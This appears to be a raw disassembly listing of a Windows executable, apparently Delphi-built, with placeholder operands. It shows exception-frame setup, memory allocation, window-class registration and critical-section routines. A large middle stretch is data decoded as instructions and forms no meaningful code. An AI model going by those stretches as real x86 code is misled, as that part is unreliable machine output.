push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_40561c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a0ea
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a118
lea eax [ ebp + 0xc ]
call sub_4055a8
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a154
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a1b7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a1e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_413bac
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a244
mov eax [ rw-data ]
call sub_413c10
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413840
call sub_403234
inc esi
dec ebx
jne r-xdata
sub_41a25c
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a284
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41a25c
lea eax [ esi + 0x5 ]
call sub_41a27c
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41a27c
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41a340
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406894
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a284
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41a3f4
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41a31c
sub_41a41c
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4c7
retn
mov eax [ rw-data ]
call sub_413030
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41a1e8
xor edx edx
xor eax eax
call sub_416404
mov eax rw-data
call sub_40cbf8
call sub_405cd8
lea eax [ eax + 0xc ]
call sub_40cbf8
mov eax rw-data
call sub_40cbf8
mov eax rw-data
call sub_4055a8
mov eax sub_41a254
call sub_405444
mov eax rw-data
call sub_40cbf8
call sub_419000
mov eax rw-data
call sub_40cbf8
mov eax rw-data
call sub_4055a8
sub_41a4cc
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a55c
retn
call sub_418fcc
mov eax sub_41a254
call sub_40543c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c938
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4055c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41292c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413a54
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413a54
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41a560
push ss
inc esi
add [ eax + 0x640000ff ] cl
push ss
inc esi
add [ ecx + 0x640000ff ] cl
push ss
inc esi
add [ edx + 0x640000ff ] cl
push ss
inc esi
add [ ebx + 0x640000ff ] cl
push ss
inc esi
add [ edi + edi * 8 + 0x16640000 ] cl
inc esi
add [ ebp + 0x640000ff ] cl
push ss
inc esi
add [ esi + 0x640000ff ] cl
push ss
inc esi
add [ edi + 0x640000ff ] cl
push ss
inc esi
add [ eax - 0x1 ] dh
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] dh
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] dh
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] dh
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] dh
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] dh
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] dh
add [ eax ] al
push ss
inc esi
add [ eax - 0x1 ] bh
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] bh
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] bh
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] bh
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] bh
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] bh
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] bh
add [ eax ] al
push ss
inc esi
add [ eax - 0x1 ] ah
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] ah
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] ah
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] ah
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] ah
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] ah
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] ah
add [ eax ] al
push ss
inc esi
add [ eax - 0x1 ] ch
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] ch
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] ch
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] ch
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] ch
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] ch
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] ch
add [ eax ] al
push ss
inc esi
add [ eax - 0x1 ] dl
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] dl
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] dl
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] dl
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] dl
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] dl
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] dl
add [ eax ] al
push ss
inc esi
add [ eax - 0x1 ] bl
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] bl
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] bl
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] bl
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] bl
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] bl
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] bl
add [ eax ] al
push ss
inc esi
add [ eax - 0x1 ] al
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] al
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] al
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] al
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] al
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] al
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] al
add [ eax ] al
push ss
inc esi
add [ eax - 0x1 ] cl
add [ eax ] al
push ss
inc esi
add [ ecx - 0x1 ] cl
add [ eax ] al
push ss
inc esi
add [ edx - 0x1 ] cl
add [ eax ] al
push ss
inc esi
add [ ebx - 0x1 ] cl
add [ eax ] al
push ss
inc esi
add [ edi + edi * 8 ] cl
add [ esi + edx + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
push ss
inc esi
add [ esi - 0x1 ] cl
add [ eax ] al
push ss
inc esi
add [ edi - 0x1 ] cl
add [ eax ] al
push ss
inc esi
add [ eax ] dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx + 0x46 ] ah
add [ ebx ] dh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a7ec
retn
sub_41a7f8
cld
cmpsd [ esi ] [ edi ]
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
pop esp
test al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 4 + 0x41 ] bl
add [ eax + eax ] cl
add [ eax ] al
int3
sub_41abad
push esp
inc edi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
call 0x2041ee32
add [ eax ] al
add [ ecx ] al
add ch bh
jmp eax
imul esp [ ebx + 0x73 ] 0xffff0001
nop
insb
lodsb [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x54 ] bh
inc ecx
add [ esp + ebp * 4 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ch [ ecx + eax * 2 + 0x41ac9200 ]
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + eax * 8 - 0x55 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ eax + eax ] ah
add [ eax ] al
dec esp
pushfd
lodsb [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6dffbe54 ] cl
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebx * 4 - 0x55 ] si
inc ecx
add [ esi + edx + 0x41 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
lodsb [ esi ]
inc ecx
xchg edx eax
jo r-xdata
stosd [ edi ]
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffffb841ec9a
rol [ ecx ] 0xc8
imul esp [ ebx + 0x73 ] 0xc08b0000
in al dx
stosd [ edi ]
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc ecx
add al dl
inc ecx
add ah bh
rol [ ecx ] 0xe
inc eax
add al ch
xor [ eax ] eax
mov eax 0xc80041c0
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ch
stosd [ edi ]
inc ecx
add [ eax ] ah
add [ esi ] cl
jo r-xdata
sub_41ada0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_41b19d
push esp
inc edi
jb r-xdata
inc eax
jo r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xb2
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0x41 ] bh
add [ eax + eax ] dh
add ah cl
mov cl 0x41
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x3041f2a6
out dx al
inc ecx
add [ esi + ebp * 8 + 0x540c0041 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
fdiv [ edx + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
mov bl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] cl
inc ecx
add [ eax + eax ] bh
add [ eax ] al
in al 0xb0
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x7400413f ] cl
xor al 0x40
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x1c41f306
stc
inc ecx
add al cl
inc ecx
add [ eax + 0x580041e7 ] bh
stc
inc ecx
add [ eax ] bl
inc eax
inc ecx
add [ ebx + edi * 8 ] ch
inc ecx
add [ ebx + edi * 8 - 0x17fbffbf ] ch
inc ecx
add [ eax - 0x2 ] ah
inc ecx
add [ edi + edi * 8 ] dl
inc ecx
add [ edi + edi * 8 + 0x41 ] dl
add [ eax - 0x17 ] dl
inc ecx
add [ eax - 0x63ffbe01 ] dh
add eax [ edx ]
cwde
or eax [ edx ]
insb
or al 0x42
add [ eax ] bh
0xd400041 0x42
add ah cl
xor [ eax ] eax
call 0x2441f246
xor al [ eax ]
push 0xc00402a
push esp
imul esp [ ebx - 0x73 ] 0xb1ac0040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
push ebx
push 0x64657261
dec ecx
or al 0x54
imul esp [ ebx + 0x30 ] 0x5c0041b1
pop ss
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
js r-xdata
jo r-xdata
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x64004010 ] ah
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
imul esp [ ebx + 0x73 ] 0x18900000
mov dl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] bl
sub_41b33d
inc [ ecx ]
and al 0xff
inc ecx
add [ eax + 0xa ] ah
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b35470
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b2d870
add [ eax + 0x41b1 ] ch
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
sbb al 0xb4
inc ecx
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx + eax * 2 + 0x3400 ] 0x0
in al 0xb0
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x7400413f ] cl
xor al 0x40
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xffffffff9841f44a
adc [ edx ] eax
enter 0x413e 0x0
mov eax 0xc80041e7
adc [ edx ] eax
sbb [ eax + 0x41 ] al
add [ eax - 0x19 ] cl
inc ecx
add [ eax ] ch
adc al [ edx ]
add al 0xe8
inc ecx
add [ eax + 0x12 ] ch
inc edx
add [ edx + edx - 0x16b3ffbe ] dl
inc ecx
add [ eax - 0x17 ] dl
inc ecx
add [ eax - 0x2fffbdee ] ch
jmp 0x156db493
imul esp [ ebx + 0x73 ] 0xc08b0000
shl [ ebx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov bl 0x41
add [ eax ] bl
add [ eax ] al
add ah cl
mov cl 0x41
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xfffffffffc41f3ee
adc [ edx ] al
sub al 0x11
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
sub_41b489
mov ah 0x41
add [ edi ] al
add eax 0x6f634954
outsb
sbb al 0xb4
inc ecx
add [ eax + 0x41b1 ] ch
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ ebp + esi * 4 + 0x41 ] ch
add [ eax ] dl
push esp
push edx
jo r-xdata
test eax 0xdb84fffe
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b530
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41b56c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41b5a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41b51c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41b590
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b683
mov eax [ ebp - 0x4 ]
call sub_41b59c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407ad4
test al al
je r-xdata
sub_41b68c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b590
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b59c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41b73c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b590
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b5a8
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b68c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7ac
mov eax [ ebp - 0x4 ]
call sub_41b59c
retn
mov eax ebx
mov si 0xfffd
call sub_403430
sub_41b7b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b590
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b817
mov eax [ ebp - 0x4 ]
call sub_41b59c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403430
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b68c
sub_41b820
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b590
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
